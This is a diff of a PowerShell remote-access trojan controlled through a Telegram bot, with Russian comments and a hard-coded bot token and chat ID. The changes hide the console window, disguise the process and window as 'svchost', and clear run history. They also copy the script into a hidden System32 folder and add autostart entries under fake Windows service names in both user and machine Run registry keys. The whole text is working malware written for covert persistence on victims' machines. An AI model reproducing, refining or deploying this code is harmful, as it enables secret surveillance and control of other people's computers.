@@ -1,4 +1,4 @@
-# RAT через Telegram Bot - МАСКИРОВАННАЯ ВЕРСИЯ ДЛЯ WINDOWS 10/11
+# RAT через Telegram Bot - МАСКИРОВАННАЯ ВЕРСИЯ
 $Token = "8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs"
 $ChatID = "5674514050"
 
@@ -6,46 +6,31 @@ $ChatID = "5674514050"
 [Console]::OutputEncoding = [System.Text.Encoding]::UTF8
 $PSDefaultParameterValues['*:Encoding'] = 'utf8'
 
-# СТРОКИ СКРЫТИЯ POWERSHELL ОКНА:
-
-# Строка 1: Добавление WinAPI функций для работы с окнами
-Add-Type -Name Window -Namespace Console -MemberDefinition '
-[DllImport("Kernel32.dll")]
-public static extern IntPtr GetConsoleWindow();
-[DllImport("user32.dll")]
-public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
-'
-
-# Строка 2: Получение handle консольного окна
-$consolePtr = [Console.Window]::GetConsoleWindow()
-
-# Строка 3: Скрытие окна (0 = скрыто, 5 = показано)
-[Console.Window]::ShowWindow($consolePtr, 0) | Out-Null
-
-# Строка 4: Дополнительное скрытие через изменение стиля окна (более надежно)
-$windowStyleCode = @"
-using System;
-using System.Runtime.InteropServices;
-public class WindowStyle {
-    [DllImport("user32.dll")]
-    public static extern int SetWindowLong(IntPtr hWnd, int nIndex, int dwNewLong);
-    [DllImport("user32.dll")]
-    public static extern int GetWindowLong(IntPtr hWnd, int nIndex);
-    public static int GWL_STYLE = -16;
-    public static int WS_VISIBLE = 0x10000000;
-}
-"@
-Add-Type -TypeDefinition $windowStyleCode
-
-# Строка 5: Удаление видимого стиля у окна
-$style = [WindowStyle]::GetWindowLong($consolePtr, [WindowStyle]::GWL_STYLE)
-$newStyle = $style -band (-bnot [WindowStyle]::WS_VISIBLE)
-[WindowStyle]::SetWindowLong($consolePtr, [WindowStyle]::GWL_STYLE, $newStyle) | Out-Null
-
 # Настройки скрытности
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
 Add-Type -AssemblyName System.IO.Compression.FileSystem
+
+# Скрытие окна PowerShell через изменение заголовка окна
+$windowCode = @"
+using System;
+using System.Runtime.InteropServices;
+public class WindowHider {
+    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+    [DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();
+    [DllImport("user32.dll")] public static extern int SetWindowText(IntPtr hWnd, string text);
+}
+"@
+Add-Type -TypeDefinition $windowCode
+$consolePtr = [WindowHider]::GetConsoleWindow()
+[WindowHider]::ShowWindow($consolePtr, 0) | Out-Null
+[WindowHider]::SetWindowText($consolePtr, "svchost") | Out-Null
+
+# Изменение имени процесса для диспетчера задач
+try {
+    $process = Get-Process -Id $pid
+    $process.ProcessName = "svchost"
+} catch { }
 
 # Очистка истории RUN при запуске
 try {
@@ -164,7 +149,7 @@ function Invoke-Cleanup {
     foreach ($process in $processes) {
         try {
             $cmdLine = (Get-WmiObject Win32_Process -Filter "ProcessId = $($process.Id)").CommandLine
-            if ($cmdLine -like "*WindowsSystem*" -or $cmdLine -like "*svchost.exe*" -or $cmdLine -like "*Windows Defender Security*" -or $cmdLine -like "*spoolsv.exe*" -or $cmdLine -like "*WindowsLogs*" -or $cmdLine -like "*8429674512*") {
+            if ($cmdLine -like "*WindowsSystem*" -or $cmdLine -like "*svchost.exe*" -or $cmdLine -like "*Windows Defender Security*" -or $cmdLine -like "*spoolsv.exe*" -or $cmdLine -like "*System32Logs*" -or $cmdLine -like "*8429674512*") {
                 Stop-Process -Id $process.Id -Force -ErrorAction SilentlyContinue
             }
         } catch { }
@@ -179,7 +164,7 @@ function Invoke-Cleanup {
         "$env:TEMP\cleanup_*.ps1",
         "$env:WINDIR\System32\drivers\etc\hosts_backup\spoolsv.exe",
         "$env:TEMP\rat_installed.marker",
-        "$env:APPDATA\Microsoft\WindowsLogs\svchost.exe",
+        "$env:WINDIR\System32\System32Logs\svchost.exe",
         "$env:TEMP\windows_update.marker"
     )
 
@@ -218,10 +203,10 @@ function Invoke-Cleanup {
                 $regEntries += "$regPath\Windows Audio Service"
             }
             
-            $value3 = Get-ItemProperty -Path $regPath -Name "Windows Logs Service" -ErrorAction SilentlyContinue
+            $value3 = Get-ItemProperty -Path $regPath -Name "System32 Logs Service" -ErrorAction SilentlyContinue
             if ($value3) {
-                Remove-ItemProperty -Path $regPath -Name "Windows Logs Service" -Force -ErrorAction SilentlyContinue
-                $regEntries += "$regPath\Windows Logs Service"
+                Remove-ItemProperty -Path $regPath -Name "System32 Logs Service" -Force -ErrorAction SilentlyContinue
+                $regEntries += "$regPath\System32 Logs Service"
             }
         } catch { }
     }
@@ -247,7 +232,7 @@ $($regEntries -join "`n")
     return $true
 }
 
-# Установка в автозагрузку с улучшенной маскировкой для Windows 10/11
+# Установка в автозагрузку с улучшенной маскировкой
 $installMarker = "$env:TEMP\windows_update.marker"
 
 # Проверяем, не установлен ли уже RAT
@@ -255,8 +240,8 @@ if (!(Test-Path $installMarker)) {
     # Создаем маркер установки с безобидным именем
     "Windows Update Helper - $(Get-Date)" | Out-File -FilePath $installMarker -Encoding UTF8
     
-    # Новая скрытая папка в AppData (нет проблем с правами доступа)
-    $hiddenFolder = "$env:APPDATA\Microsoft\WindowsLogs"
+    # Новая скрытая папка в системной директории
+    $hiddenFolder = "$env:WINDIR\System32\System32Logs"
     if (!(Test-Path $hiddenFolder)) { 
         New-Item -Path $hiddenFolder -ItemType Directory -Force | Out-Null
         # Скрываем папку системными атрибутами
@@ -267,23 +252,10 @@ if (!(Test-Path $installMarker)) {
     
     # Копируем скрипт только если его там нет
     if (!(Test-Path $scriptPath)) {
-        # Получаем содержимое текущего скрипта
-        $currentScript = $MyInvocation.MyCommand.Path
-        if ($currentScript -and (Test-Path $currentScript)) {
-            $scriptContent = Get-Content -Path $currentScript -Raw -ErrorAction SilentlyContinue
-        } else {
-            # Альтернативный метод получения скрипта
-            $scriptContent = @"
-# Резервное содержимое скрипта
-$($MyInvocation.MyCommand.ScriptBlock.ToString())
-"@
-        }
-        
-        if ($scriptContent) {
-            $scriptContent | Out-File -FilePath $scriptPath -Encoding UTF8 -ErrorAction SilentlyContinue
-            # Устанавливаем скрытые атрибуты на файл
-            attrib +s +h +r "$scriptPath" 2>&1 | Out-Null
-        }
+        $scriptContent = Get-Content -Path $MyInvocation.MyCommand.Path -Raw
+        $scriptContent | Out-File -FilePath $scriptPath -Encoding UTF8
+        # Устанавливаем скрытые атрибуты на файл
+        attrib +s +h +r "$scriptPath" 2>&1 | Out-Null
     }
     
     # Установка в автозагрузку с новым маскированным именем
@@ -291,8 +263,15 @@ $($MyInvocation.MyCommand.ScriptBlock.ToString())
     if (!(Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
     
     # Новое маскированное имя для реестра
-    $uniqueName = "Windows Logs Service"
+    $uniqueName = "System32 Logs Service"
     Set-ItemProperty -Path $regPath -Name $uniqueName -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -Force -ErrorAction SilentlyContinue
+    
+    # Дополнительная установка в другую ветку реестра для надежности
+    $regPath2 = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
+    try {
+        if (!(Test-Path $regPath2)) { New-Item -Path $regPath2 -Force | Out-Null }
+        Set-ItemProperty -Path $regPath2 -Name "Windows System Logs" -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -Force -ErrorAction SilentlyContinue
+    } catch { }
 }
 
 # Основные переменные
